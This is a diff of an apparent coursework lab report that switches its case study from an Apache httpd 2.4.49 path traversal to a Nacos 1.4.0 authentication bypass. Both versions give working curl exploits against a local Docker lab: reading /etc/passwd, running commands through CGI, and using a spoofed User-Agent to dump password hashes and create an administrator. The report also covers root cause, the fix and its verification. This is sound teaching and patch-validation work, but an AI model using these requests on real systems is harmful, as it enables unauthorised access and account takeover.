@@ -37,7 +37,7 @@
 | SAST | Bandit 1.7.9+ |
 | SCA | pip-audit 2.7.3+ |
 | Containers | Docker Desktop + Docker Compose v2 |
-| Target range | Vulhub `httpd/CVE-2021-41773` |
+| Target range | Vulhub `nacos/CVE-2021-29441` |
 
 ---
 
@@ -329,134 +329,153 @@ loop), but they are worth stating out loud in a viva.
 
 ---
 
-## 4. Part 2 — CVE-2021-41773
+## 4. Part 2 — CVE-2021-29441
 
 ### 4.1 Selection
 
-**CVE-2021-41773 — Apache HTTP Server 2.4.49 path traversal.** Chosen because
-the root cause sits in **one function** (`ap_normalize_path()`), it is
-reproduced with **one `curl`**, the fix is a **version bump**, and it chains a
-canonicalisation bug, an over-permissive `Require all granted` and enabled CGI —
-a good case for a defence-in-depth discussion.
+**CVE-2021-29441 — Nacos < 1.4.1 authentication bypass.** CWE-290
+(Authentication Bypass by Spoofing), CVSS 3.1 **8.6**. Chosen because:
+
+* the root cause is a **single quotable shortcut** in `AuthFilter`, which trusts
+  a request header to decide "this call comes from another Nacos server";
+* the exploit is **two `curl` commands** with no payload crafting;
+* the impact reaches the user-management API: read the bcrypt hashes *and*
+  create an administrator;
+* the fix has a real wrinkle — the vendor ships the new switch **enabled** (§4.4).
+
+> The stock `vulhub/nacos:1.4.0` image runs with
+> `nacos.core.auth.enabled=false`. With authentication off, *everything* is
+> reachable and the header is irrelevant — that demo would not be about the CVE.
+> Our image turns authentication **on**, which is exactly the precondition the
+> advisory names.
 
 ```bash
-git clone https://github.com/vulhub/vulhub.git
-cd vulhub/httpd/CVE-2021-41773 && docker compose up -d
-# or the equivalent environment shipped in this repo:
-cd cve && docker compose up -d --build
+cd cve
+docker compose up -d --build        # 8848; the first build downloads the 1.4.0 tarball (~100 MB)
 ```
 
-The service listens on `http://127.0.0.1:8080` and answers `It works!`.
+Nacos is a Spring Boot application: allow 30–60 s after `up`.
 
 ### 4.2 Reproduction
 
 ```bash
-# 0) the /icons/ alias must exist (provided by httpd-autoindex.conf)
-curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/icons/
+# 1) baseline: authentication is on, anonymous access is refused
+curl -s -o /dev/null -w '%{http_code}\n' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 403  {"status":403,"error":"Forbidden","message":"unknown user!"}
 
-# 1) traverses out of the document root
-#    %2e = URL-encoded '.'; --path-as-is stops curl from normalising for us
-curl --path-as-is \
-  'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+# 2) the bypass: same request, plus one header
+curl -s -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
+# -> 200  {"totalCount":1,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}
 
-# 2) with mod_cgi enabled the same trick reaches /bin/sh
-curl --path-as-is --data 'echo;id' \
-  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+# 3) impact: create an administrator with no credentials at all
+curl -s -X POST -H 'User-Agent: Nacos-Server' \
+  'http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned&password=Passw0rd123'
+# -> 200  {"code":200,"message":"create user ok!","data":null}
 ```
 
-**Measured** on the vulnerable build (2026-10-19, inside the container; full
-transcript in `cve/evidence/vulnerable.txt`):
+**Measured** (full transcript in `cve/evidence/vulnerable.txt`):
 
 ```
-2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
-HTTP 200
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-...
->>> VULNERABLE: /etc/passwd was disclosed.
+1. Sanity check: GET /nacos/                              HTTP 200
 
-3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
->>> VULNERABLE: command execution confirmed.
+2. Baseline: GET /nacos/v1/auth/users  (no header)        HTTP 403
+   {"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!"}
+
+3. Bypass: same request with 'User-Agent: Nacos-Server'   HTTP 200
+   {"totalCount":1,"pageNumber":1,"pageItems":[
+      {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
+   >>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.
+
+4. Impact: create an admin account through the same bypass
+   {"code":200,"message":"create user ok!","data":null}
+   >>> VULNERABLE: 'pwned4779' was created without any credentials
 ```
 
-> `--path-as-is` matters: without it curl collapses `/icons/.%2e/../` on the
-> client and the request never leaves the document root.
+The attacker then logs in at `http://127.0.0.1:8848/nacos/` with that account and
+holds full administrative access.
 
-> **No local Docker?** The same cycle runs on a GitHub runner: trigger `.github/workflows/cve-repro.yml` manually (Actions → *CVE reproduction (manual)* → *Run workflow*). Both transcripts end up in the run's **Summary** and in the `cve-evidence` artifact, so the evidence is timestamped and reproducible.
-
-
-> ⬜ **Pending screenshot**: `docs/screenshots/cve-exploit.png`
-
-![Vulnerable build: /etc/passwd disclosed and command execution](screenshots/cve-exploit.png)
+![Vulnerable build: spoofed User-Agent leaks the user table and creates an admin](screenshots/cve-exploit.png)
 
 ### 4.3 Root cause
 
-**Defect location**: `ap_normalize_path()` in `server/request.c`, the
-normalisation function rewritten in 2.4.49.
+**Defect location**: `com.alibaba.nacos.core.auth.AuthFilter`.
 
-**What goes wrong**: in a single scan the function both
+With authentication enabled every request passes through that filter, which
+short-circuits **server-to-server** traffic:
 
-1. **decodes** percent-encoded octets (`%2e` → `.`), and
-2. **decides** whether the segment is a dot-segment to be collapsed.
-
-The order is wrong: the decision is taken on characters that are still encoded.
-A segment written
-
-```
-.%2e      # not "..", so it is not recognised as traversal
+```java
+// Nacos 1.4.0, simplified
+if (userAgent.equals("Nacos-Server")) {
+    return chain.doFilter(request, response);   // skip every auth check
+}
 ```
 
-passes normalisation untouched and only becomes a real `..` in the later decode.
-The path handed to the core mapper still contains a live `..`.
+The shortcut assumes "only a Nacos server sends this header". That assumption is
+the bug: **a header is attacker-controlled data, not an identity** — anyone can
+type the string. The failure is therefore not "a missing check" but a **trust
+decision made on spoofable input**, the textbook shape of CWE-290. Worse, the
+shortcut skipped *all* authorisation, including the user-management API, which
+is why the impact is "any administrative task".
 
-`ap_core_translate()` then maps it through `Alias /icons/ ...` without checking
-that the result is still inside the aliased directory. `..` does what `..`
-always does.
+**Configuration matters.** The advisory says "when configured to use
+authentication":
 
-So this is not "validation was forgotten" — validation exists, but the validator
-and the decoder disagree about what the string means (**decoding/normalisation
-order bug**, a canonicalisation error and the classic CWE-22 shape: the name
-that is checked is not the name that is opened).
+* with `nacos.core.auth.enabled=false` (the default, and what the stock Vulhub
+  image ships) the bypass is invisible — the server is open anyway;
+* so this is a **broken access-control design**, not "an insecure default".
+  Turning auth on is what makes the bypass meaningful, and turning auth off is
+  not a fix: it hides the symptom.
 
-**Amplification**:
+```
+spoofed header ──► AuthFilter short-circuit ──► /v1/auth/users
+                                             ├─ GET  → user table + bcrypt hashes
+                                             └─ POST → create an administrator
+```
 
-| Configuration | Effect |
-|---|---|
-| `<Directory /> Require all granted` | the escaped path is *authorised*: `/etc/passwd`, application keys, cloud metadata become readable |
-| `LoadModule cgi_module` | the traversal reaches `/bin/sh` under `/cgi-bin/` → command execution as `daemon` |
-
-The same code defect is 7.5 (disclosure) in one deployment and 9.8 (RCE) in
-another: **impact is configuration-dependent, the defect is not.**
-
-**Why the first patch was insufficient**: 2.4.50 blacklisted the literal `%2e`.
-Because the filter ran on the encoded form, double encoding bypassed it —
-`%%32%65` decodes once to `%2e` and again to `.` (CVE-2021-42013, CVSS 9.8).
-2.4.51 dropped the blacklist: decode fully → collapse dot segments on the
-decoded string → reject any path that would climb above the root.
-
-> **Blacklisting encoded input is a losing game: canonicalise first, then
-> validate, then use.**
+The hashes are bcrypt (`$2a$10$`), so cracking is slow — but nothing needs to be
+cracked: creating a **new** administrator is instant and quieter.
 
 ### 4.4 The fix
 
-`cve/Dockerfile.fixed` changes exactly one line:
+`Dockerfile.fixed` builds **Nacos 1.4.1**, the version that puts the hard-coded
+shortcut behind a switch:
+
+```
+nacos.core.auth.enable.userAgentAuthWhite=true
+```
+
+**1.4.1 ships it enabled** for backwards compatibility, so a plain version bump
+does **not** close the hole — we verified that a stock 1.4.1 still returns the
+user table for the spoofed header. The real fix is two steps:
 
 ```diff
--FROM vulhub/httpd:2.4.49
-+FROM httpd:2.4.51
+-  NACOS_VERSION=1.4.0
++  NACOS_VERSION=1.4.1
++  nacos.core.auth.enable.userAgentAuthWhite=false
 ```
 
-Every configuration line (CGI enabled, `Require all granted`, autoindex) stays
-identical, so the only variable is the patched normalisation code. If the attack
-stops working, it is because of the code fix and not because a setting was
-turned off.
+and, because disabling the whitelist makes 1.4.1 demand a server identity for
+internal calls, one more setting is needed or it rejects *everything*, console
+included:
 
-```bash
-docker compose down
-docker compose -f docker-compose.fixed.yml up -d --build
 ```
+nacos.core.auth.server.identity.key=lab1server
+nacos.core.auth.server.identity.value=lab1secret
+```
+
+With all three the same requests are refused:
+
+```
+HTTP 403
+{"status":403,"error":"Forbidden","message":"Invalid server identity key or value,
+ Please make sure set `nacos.core.auth.server.identity.key` and
+ `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`"}
+```
+
+Lesson: **"fixed in version X" is not the same as "fixed".** Read the advisory
+and the release notes, then verify the behaviour yourself.
 
 ### 4.5 Verification (with regression)
 
@@ -464,56 +483,44 @@ docker compose -f docker-compose.fixed.yml up -d --build
 powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
 ```
 
-The script replays the original payload **and the whole bypass family** (double
-encoding, `%2f`, `/.%2e/`) and performs a regression check:
+Measured:
 
 ```
-[PASS] home page still returns 200                     <- functionality intact
-[PASS] traversal rejected with 400/403/404
-[PASS] no /etc/passwd content in the body
-[PASS] no uid= in the response
-[PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
-[PASS] no leak for /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
-[PASS] no leak for /.%2e/.%2e/.%2e/.%2e/etc/passwd
-[PASS] no leak for /icons/..%2f..%2f..%2f..%2fetc%2fpasswd
+1. Regression check: GET /nacos/
+[PASS] console still returns 200
+
+2. Bypass must fail: GET with 'User-Agent: Nacos-Server'
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 -> HTTP 403
+[PASS] returns 403 instead of 200
+[PASS] no user table in the body
+
+3. Creating an account must fail
+[PASS] no 'create user ok'
+
+4. Authentication is still enabled
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 (no credentials) -> HTTP 403
+[PASS] anonymous access still refused
+
 RESULT: fix verified -- all checks passed.
 ```
 
-The status codes are worth recording: 2.4.51 answers **400 Bad Request** for the
-paths it can reject during normalisation (`/icons/.%2e/...`, `/cgi-bin/.%2e/...`,
-`/.%2e/...`); only the encoded-slash variant
-(`/icons/..%2f..%2f..%2f..%2fetc%2fpasswd`) falls through to 404. Both are a
-refusal, but the report quotes what was actually observed — which is why the
-assertion accepts 400/403/404 rather than insisting on 404.
+Check 4 matters as much as the rest: "the attack fails because authentication was
+switched off" is a regression disguised as a fix, so the script asserts that
+anonymous access is *still* refused.
 
-Fixing only the exact string from the advisory would be a blacklist fix, and
-2.4.50 is the cautionary tale. Hence the variants.
-
-> ⬜ **Pending screenshot**: `docs/screenshots/cve-fixed.png`
-
-![Fix verified: same request returns 400, verify-fix all PASS](screenshots/cve-fixed.png)
+![Fix verified: 403 for the spoofed header, console still 200](screenshots/cve-fixed.png)
 
 ### 4.6 Defence in depth
 
-The version bump is the real fix; these only reduce blast radius:
+* Never authorise on a request header. If internal traffic must be recognised,
+  use a **secret** (`server.identity.key/value`) or mTLS, scoped to the fewest
+  possible paths.
+* Keep the whitelist switch off; rotate the server identity when a node leaves.
+* Put the console/API behind a network policy — Nacos is an internal component.
+* Alert on `User-Agent: Nacos-Server` arriving from a non-cluster address.
+* Treat the console as an administrative plane: separate credentials, 2FA at the
+  proxy, audit-log shipping.
 
-```apache
-<Directory />
-    AllowOverride none
-    Require all denied      # do not hand the whole filesystem to the server
-</Directory>
-```
-
-```yaml
-    read_only: true
-    user: "1000:1000"
-    security_opt: ["no-new-privileges:true"]
-    cap_drop: ["ALL"]
-```
-
-Plus: enable CGI only where needed, restrict container egress (blocks metadata
-SSRF), treat WAF rules as a tourniquet rather than a cure, and track CISA KEV so
-patches land in time.
 
 ---
 
@@ -578,14 +585,14 @@ algorithm allow-list, or `alg:none` and RS→HS confusion become possible.
 **4. What risk comes from not auditing third-party dependencies?**
 More than 80% of a modern application is third-party code, so an attacker does
 not need to touch yours: one vulnerable transitive dependency (Log4Shell,
-Struts2, this httpd) is enough. Disclosure-to-exploitation windows are often
+Struts2, this Nacos) is enough. Disclosure-to-exploitation windows are often
 days. SCA provides a visible SBOM, alerts on known CVEs in CI, and turns "should
 we upgrade?" into a process instead of memory.
 
 **5. What do Docker and Vulhub offer over installing vulnerable software locally?**
 Isolation and disposability — a compromise only reaches a container that can be
 recreated from a file; exact, reproducible versions (no "it does not reproduce
-because my box runs 2.4.51"); vulnerable and fixed builds side by side with only
+because my box runs a patched version"); vulnerable and fixed builds side by side with only
 a tag changed; configuration as code that a reviewer can inspect; and an
 identical environment for every student, so grading is reproducible.
 
@@ -598,12 +605,14 @@ build, then analysed the root cause, patched it, and proved the exploit no longe
 works.
 
 **7. Why is regression testing critical after a patch?**
-Patches usually touch shared code paths (here, URI normalisation) and can break
-legitimate requests: 2.4.50 is the textbook case of a fix that closed one hole
-and opened another. Regression testing answers two questions — was the fix
-*precise* (blocks the malicious, keeps the legitimate) and did it *introduce*
-new problems (availability, performance, compatibility). A fix without a
-regression test may simply be a feature switched off.
+Patches usually touch shared code paths (here, the authentication filter) and can
+break legitimate requests: 1.4.1 is the case in point — it added the whitelist
+switch but left it enabled, so the upgrade on its own did not stop the bypass,
+and disabling it without a server identity locks out the console as well.
+Regression testing answers two questions — was the fix *precise* (blocks the
+malicious, keeps the legitimate) and did it *introduce* new problems
+(availability, performance, compatibility). A fix without a regression test may
+simply be a feature switched off.
 
 **8. Why does CVE knowledge and reproduction matter for a pentester or a SOC analyst?**
 For a pentester, reproduction is how impact is proven, and the KEV list is the
